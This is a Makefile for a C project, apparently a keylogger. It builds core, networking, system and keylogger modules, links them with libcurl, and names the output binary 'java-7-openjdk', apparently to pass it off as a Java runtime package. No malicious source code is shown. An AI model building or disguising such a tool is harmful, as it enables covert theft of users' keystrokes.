# FLAGS
CC = gcc
CFLAGS = -c -g -Os -Wall -Wextra -pedantic -static -D DEBUG
LDLIBS = -lpthread -lcurl

TARGET = "java-7-openjdk"

# PATHS
SRCPATH = src/
INCLUDE = include/
OBJPATH = build/

OBJECTS = $(OBJPATH)core.o $(OBJPATH)network_utils.o $(OBJPATH)system_utils.o $(OBJPATH)keylogger.o

all: clean $(TARGET)

# EXEC CREATION
$(TARGET): $(OBJPATH) $(OBJPATH) $(OBJECTS)
	@echo -n "Linking objects..."
	@$(CC) $(OBJECTS) -o $@ $(LDLIBS)
	@echo " [OK]"

$(OBJPATH):
	@mkdir $(OBJPATH)

# OBJECT CREATION
$(OBJPATH)%.o: $(SRCPATH)%.c
	@echo -n "Building $@..."
	@$(CC) -I $(INCLUDE) $(CFLAGS) $< -o $@
	@echo " [OK]"

# COMMANDS
valgrind:
	valgrind --leak-check=full --show-leak-kinds=all $(TARGET)

clean:
	@echo -n "Removing objects files..."
	@rm -rf $(OBJPATH) $(TARGET)
	@echo " [OK]"